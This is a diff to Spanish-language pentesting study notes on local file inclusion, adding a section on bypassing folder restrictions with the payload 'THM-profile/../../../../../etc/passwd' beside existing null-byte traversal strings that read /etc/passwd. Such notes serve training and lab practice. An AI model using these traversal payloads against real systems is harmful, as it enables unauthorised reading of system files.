@@ -38,6 +38,10 @@ si el desarrollador concatena el $filename con por ejemplo .php, el fichero que 
 ....//....//....//....//etc/passwd%00
 ....//....//....//....//etc/passwd\0
 ```
+## Cuando no te deja escapar de la carpeta
+![imagen](https://github.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/assets/137443771/87a20c84-f98e-4c87-b237-aff774e0a078)
+
+```THM-profile/../../../../../etc/passwd ```
 
 
 # Jugando con wrappers
